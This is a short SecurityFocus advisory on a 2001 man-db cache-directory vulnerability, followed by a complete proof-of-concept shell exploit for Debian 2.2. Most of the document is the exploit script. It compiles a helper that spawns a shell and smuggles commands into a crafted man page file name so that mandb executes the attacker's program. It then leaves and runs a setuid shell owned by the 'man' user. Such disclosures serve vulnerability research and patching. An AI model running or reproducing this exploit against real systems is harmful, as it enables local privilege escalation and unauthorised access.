source: http://www.securityfocus.com/bid/2815/info

A vulnerability exists in the 'man' system manual pager program.

It is possible for local users to cause man to cache files in the system cache directory from outside of the configured manual page hierarchy search path.

Combined with the behaviours of 'man' and 'mandb' or any other utilities which trust cache filenames, it may be possible to use this vulnerability to elevate privileges.

#!/bin/sh
###################################################
# Fri Jun  1 23:00:10 JAVT 2001                   #
# ----------------------------------------------- #
# man MANPATH symlink redirection bugs            #
# proof of concept.                               #
# version affected:                               #
#   <= man-db 2.3.16-3,2.3.17-3.2                 #
#                                                 #
# tested on:                                      #
#  debian2.2 -> instant man suidshell             #
#                                                 #
# by jenggo <luki@karet.org>                      #
#                                                 #
# thanx to: echo, mayonaise all @ #karet          #
# ==> Mr.dur,amien,mega,akbar ... damai,damai ;)  #
###################################################

TMPDIR=/tmp/mywork

RAND=`/bin/date +%S`
echo "making working dir ..."
/bin/mkdir -p $TMPDIR/man/man1
/bin/chmod 777 $TMPDIR
/bin/chmod 777 $TMPDIR/man

echo "copying needed files ..."
if [ ! -x /usr/bin/groff ] || [ ! -x /usr/bin/grotty ] || [ ! -x /usr/bin/troff ] || [ ! -x /usr/bin/gcc ]; then
  echo "Failed, I need executable : groff,grotty,troff,gcc"
  echo "cleaning up ..."
  /bin/rm -rf $TMPDIR
fi

/bin/cp /usr/bin/groff $TMPDIR
/bin/cp /usr/bin/grotty $TMPDIR
/bin/cp /usr/bin/troff $TMPDIR

echo "compiling helper ..."
/bin/cat > $TMPDIR/hehe.c <<EOF
#include <stdio.h>

int main()
{
  char *aa[2]={"/bin/sh", NULL};
    
  setreuid(6,6);
  execve(aa[0], aa, NULL);
  exit(0);
}
EOF

/usr/bin/gcc $TMPDIR/hehe.c -o $TMPDIR/hehe 2>/dev/null 1>/dev/null

/bin/cat > $TMPDIR/mandeb.c <<EOF
#include <stdio.h>

int main()
{
  seteuid(6);
  setuid(6);
  system("/bin/cp /tmp/mywork/hehe /tmp/huhu");
  system("/bin/chown man /tmp/huhu");
  system("/bin/chmod 4755 /tmp/huhu");
  exit(0);
}
EOF

/usr/bin/gcc $TMPDIR/mandeb.c -o $TMPDIR/mandeb 2>/dev/null 1>/dev/null

echo "making our manpage ..."
/bin/ln -s /var/cache/man/cat1 $TMPDIR/man/cat1
/bin/echo "bebas euy"|/bin/gzip -c > $TMPDIR/man/man1/"cihuy$RAND.1.gz;cd ..;cd ..;cd ..;cd ..;cd ..;cd tmp;cd mywork;export PATH=.;mandeb;echo ls.1.gz"
/bin/touch $TMPDIR/"cihuy$RAND.1.gz;cd ..;cd ..;cd ..;cd ..;cd ..;cd tmp;cd mywork;export PATH=.;mandeb;echo ls"
export PATH=$TMPDIR
/usr/bin/man "cihuy$RAND.1.gz;cd ..;cd ..;cd ..;cd ..;cd ..;cd tmp;cd mywork;export PATH=.;mandeb;echo ls" 2> /dev/null 1>/dev/null

echo "/bin/ls -la /var/cache/man/cat1"
/bin/ls -la /var/cache/man/cat1
export PATH=/var/cache:/bin:/sbin:/usr/bin:/usr/sbin

echo "exploiting ..."
/bin/rm -f /tmp/huhu
/usr/lib/man-db/mandb 2>/dev/null 1>/dev/null
/bin/rm -rf /tmp/mywork

echo
echo "/bin/ls -la /tmp"
/bin/ls -la /tmp

if [ -u /tmp/huhu ]; then
  echo "file /tmp/huhu is setuid. Hope it's owned by man"
  echo "Have a nice day"
  echo "[----- jenggo <luki@karet.org> -----]"
  /tmp/huhu
else
  echo "exploit failed, cleaning up our binary ..."
fi

echo "cleaning up our preparation step dir ..."
/bin/rm -rf /tmp/$TMPDIR